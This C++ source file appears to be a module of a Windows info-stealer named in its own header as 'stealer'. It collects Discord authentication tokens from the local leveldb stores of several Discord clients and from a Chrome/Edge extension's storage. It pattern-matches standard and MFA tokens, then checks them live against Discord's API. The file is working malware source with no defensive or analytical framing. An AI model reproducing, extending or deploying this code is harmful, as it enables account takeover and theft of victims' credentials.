#include "stealer.h"
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cstring>

#pragma comment(lib, "winhttp.lib")

namespace fs = std::filesystem;

// ── Helpers ───────────────────────────────────────────────────────────────────

static std::string get_appdata_roaming() {
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path) == S_OK)
        return std::string(path);
    return "";
}

static std::string get_localappdata() {
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) == S_OK)
        return std::string(path);
    return "";
}

// Collect all candidate leveldb directories where Discord stores tokens
static std::vector<fs::path> discord_leveldb_paths() {
    std::string roaming = get_appdata_roaming();
    std::string local   = get_localappdata();
    std::vector<fs::path> paths;

    const char* candidates[] = {
        // Desktop clients
        "\\Discord\\Local Storage\\leveldb",
        "\\discordcanary\\Local Storage\\leveldb",
        "\\discordptb\\Local Storage\\leveldb",
        "\\Lightcord\\Local Storage\\leveldb",
        nullptr
    };
    for (int i = 0; candidates[i]; i++) {
        fs::path p = roaming + candidates[i];
        if (fs::exists(p)) paths.push_back(p);
    }

    // Chrome / Edge extension caches
    const char* chrome_ext_paths[] = {
        "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
        "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
        nullptr
    };
    for (int i = 0; chrome_ext_paths[i]; i++) {
        fs::path p = local + chrome_ext_paths[i];
        if (fs::exists(p)) paths.push_back(p);
    }

    return paths;
}

// Token format validation: mfa.xxx or three-part base64url
static bool is_valid_token(const std::string& token) {
    if (token.size() < 50) return false;
    if (token.rfind("mfa.", 0) == 0) return token.size() > 55;
    // Standard: <24chars>.<6chars>.<27-38 chars> — all base64url
    size_t d1 = token.find('.');
    if (d1 == std::string::npos || d1 < 20 || d1 > 30) return false;
    size_t d2 = token.find('.', d1 + 1);
    if (d2 == std::string::npos) return false;
    size_t seg2 = d2 - d1 - 1;
    size_t seg3 = token.size() - d2 - 1;
    if (seg2 < 4 || seg2 > 8)   return false;
    if (seg3 < 20 || seg3 > 50) return false;
    for (char c : token) {
        if (!isalnum((unsigned char)c) && c != '.' && c != '-' && c != '_')
            return false;
    }
    return true;
}

// Scan a file for both MFA and standard tokens
static void scan_file_for_tokens(const fs::path& filepath, std::vector<std::string>& out) {
    std::ifstream f(filepath, std::ios::binary);
    if (!f.is_open()) return;

    std::string content((std::istreambuf_iterator<char>(f)),
                         std::istreambuf_iterator<char>());

    // Pattern 1: mfa. prefix
    const std::string mfa_pre = "mfa.";
    size_t pos = 0;
    while ((pos = content.find(mfa_pre, pos)) != std::string::npos) {
        size_t end = pos;
        while (end < content.size() &&
               (isalnum((unsigned char)content[end]) || content[end] == '.' ||
                content[end] == '-' || content[end] == '_'))
            ++end;
        std::string cand = content.substr(pos, end - pos);
        if (is_valid_token(cand)) out.push_back(cand);
        pos = end;
    }

    // Pattern 2: standard token embedded in JSON values ("token":"xxx")
    // Also scan raw — look for long base64url sequences
    for (size_t i = 0; i < content.size(); ) {
        // Skip until we find a sequence of base64url chars >= 24
        if (!isalnum((unsigned char)content[i]) && content[i] != '-' && content[i] != '_') {
            ++i; continue;
        }
        size_t start = i;
        while (i < content.size() &&
               (isalnum((unsigned char)content[i]) || content[i] == '-' ||
                content[i] == '_' || content[i] == '.'))
            ++i;
        size_t len = i - start;
        if (len >= 50 && len <= 100) {
            std::string cand = content.substr(start, len);
            if (is_valid_token(cand)) out.push_back(cand);
        }
    }
}

// ── Discord API token validation via WinHTTP ──────────────────────────────────

static bool winhttp_token_check(const std::string& token) {
    HINTERNET hSession = WinHttpOpen(L"ZEDClient/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", 443, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
                                            L"/api/v9/users/@me",
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Add Authorization header
    int wlen = MultiByteToWideChar(CP_UTF8, 0, token.c_str(), -1, nullptr, 0);
    std::wstring wtoken(wlen - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, token.c_str(), -1, wtoken.data(), wlen);
    std::wstring auth_hdr = L"Authorization: " + wtoken;
    WinHttpAddRequestHeaders(hRequest, auth_hdr.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    bool valid = false;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, nullptr)) {
        DWORD status = 0, sz = sizeof(status);
        WinHttpQueryHeaders(hRequest,
                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz,
                            WINHTTP_NO_HEADER_INDEX);
        valid = (status == 200);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return valid;
}

// ── Exported functions ────────────────────────────────────────────────────────

extern "C" {

int zed_discord_grab_tokens(char* out_buf, int buf_size) {
    auto paths = discord_leveldb_paths();
    std::vector<std::string> tokens;

    for (auto& dir : paths) {
        try {
            for (auto& entry : fs::directory_iterator(dir)) {
                auto ext = entry.path().extension().string();
                if (ext == ".ldb" || ext == ".log" || ext == ".json") {
                    scan_file_for_tokens(entry.path(), tokens);
                }
            }
        } catch (...) {}
    }

    // Deduplicate
    std::sort(tokens.begin(), tokens.end());
    tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());

    std::ostringstream oss;
    for (size_t i = 0; i < tokens.size(); ++i) {
        if (i > 0) oss << '\n';
        oss << tokens[i];
    }

    std::string result = oss.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_buf, result.c_str(), copy_len);
    out_buf[copy_len] = '\0';
    return (int)tokens.size();
}

int zed_discord_check_token(const char* token) {
    if (!token || strlen(token) < 50) return 0;
    return winhttp_token_check(std::string(token)) ? 1 : 0;
}

} // extern "C"
